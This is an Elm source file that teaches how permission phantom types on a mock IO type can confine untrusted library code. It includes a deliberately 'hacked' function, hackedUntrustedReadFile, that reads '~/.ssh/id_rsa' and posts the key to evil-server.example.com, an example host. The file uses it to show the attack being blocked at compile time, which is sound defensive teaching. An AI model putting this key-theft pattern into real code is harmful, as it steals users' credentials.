module Safe exposing (..)

{-| An example of how permissions can be added to a monadic IO type.
-}

import Html exposing (Html)


{-| IO now has a parameter for permissions.
-}
type IO permissions err ok
    = IO


{-| The IO permissions parameter consists of a record and
some phantom types indicating which permissions a certian
operation needs. For example

    readFile : String -> IO { a | fs_read : Allow } Error String

requires filesystem read permissions.

Here are some other examples

-}
type alias AnyPermission fs_read fs_write net =
    { fs_read : fs_read
    , fs_write : fs_write
    , net : net
    }


type alias DenyAll =
    { fs_read : Deny
    , fs_write : Deny
    , net : Deny
    }


type alias FilesystemReadOnly =
    { fs_read : Allow
    , fs_write : Deny
    , net : Deny
    }


{-| Phantom type used for building access lists. More on this later.
-}
type Perm i o
    = Perm


{-| Phantom type
-}
type Allow
    = Allow


{-| Phantom type
-}
type Deny
    = Deny


type alias Error =
    String


{-| We read some file and post the contents to a server. This requires our
app to have both `fs_read` and `net` permissions. Following a good security
practice we `Deny` writing to the file system using our type declaration.

If someone would add a `writeFile` operations somewhere in our program it
won't compile anymore.

Try adding

    |> andThen (\_ -> writeFile "somefile.txt" "Hello")

at the end.

-}
program1 : IO { fs_read : Allow, fs_write : Deny, net : Allow } Error ()
program1 =
    untrustedReadFile "somefile.txt"
        |> andThen postToTrustedServer


{-| Since our app has `net` permission an undtrusted part (maybe in a lib)
can exploit that. If `untrustedReadFile` got "hacked" to spy on us
the program would still compile.
-}
program2 : IO { fs_read : Allow, fs_write : Deny, net : Allow } Error ()
program2 =
    --untrustedReadFile "somefile.txt"
    hackedUntrustedReadFile "somefile.txt"
        |> andThen postToTrustedServer


{-| To solve this you can restrict permissions to the part of your code
you don't trust.

Now `untrustedReadFile` is restricted to only allow file read access.

Try changing `untrustedReadFile` to `hackedUntrustedReadFile` and the program
will no longer compile.

-}
program3 : IO { fs_read : Allow, fs_write : Deny, net : Allow } Error ()
program3 =
    --hackedUntrustedReadFile "somefile.txt"
    untrustedReadFile "somefile.txt"
        |> restrict
            (denyAll
                |> allowFsRead
            )
        |> andThen postToTrustedServer


{-| Some function from a 3rd-party lib that we don't trust.
-}
untrustedReadFile : String -> IO { p | fs_read : Allow } Error String
untrustedReadFile s =
    readFile s


{-| The function got "hacked" to steal your secrets. This is however reflected
in the type which now requires `net : Allow` permission.
-}
hackedUntrustedReadFile : String -> IO { p | fs_read : Allow, net : Allow } Error String
hackedUntrustedReadFile s =
    readFile s
        |> andThen
            (\content ->
                readFile "~/.ssh/id_rsa"
                    |> andThen
                        (\privateKey ->
                            post "https://evil-server.example.com" privateKey
                                |> andThen (\_ -> return content)
                        )
            )


{-| Our trusted server.
-}
postToTrustedServer : String -> IO { p | net : Allow } Error ()
postToTrustedServer content =
    post "https://nice-server.example.com" content



-- Permissions


{-| Deny everything.
-}
denyAll :
    Perm
        { fs_read : Deny
        , fs_write : Deny
        , net : Deny
        }
        { fs_read : a
        , fs_write : b
        , net : c
        }
denyAll =
    Perm


allowNet :
    Perm { p1 | net : i } { p2 | net : o }
    -> Perm { p1 | net : Allow } { p2 | net : Allow }
allowNet p =
    Perm


allowFsRead :
    Perm { p1 | fs_read : i } { p2 | fs_read : o }
    -> Perm { p1 | fs_read : Allow } { p2 | fs_read : Allow }
allowFsRead _ =
    Perm


allowFsWrite :
    Perm { p1 | fs_write : i } { p2 | fs_write : o }
    -> Perm { p1 | fs_write : Allow } { p2 | fs_write : Allow }
allowFsWrite _ =
    Perm


restrict : Perm required pass -> IO required err ok -> IO pass err ok
restrict _ IO =
    IO



-- IO mock functions


return : a -> IO all x a
return a =
    IO


andThen : (a -> IO p e b) -> IO p e a -> IO p e b
andThen fn mo =
    IO


map : (a -> b) -> IO p e a -> IO p e b
map fn IO =
    IO



-- File System mock functions


readFile : String -> IO { a | fs_read : Allow } Error String
readFile n =
    IO


writeFile : String -> String -> IO { a | fs_write : Allow } Error ()
writeFile n c =
    IO



-- HTTP mock functions


get : String -> IO { a | net : Allow } Error String
get n =
    IO


post : String -> String -> IO { a | net : Allow } Error ()
post n c =
    IO


main : Html ()
main =
    Html.text "Safe IO examples"

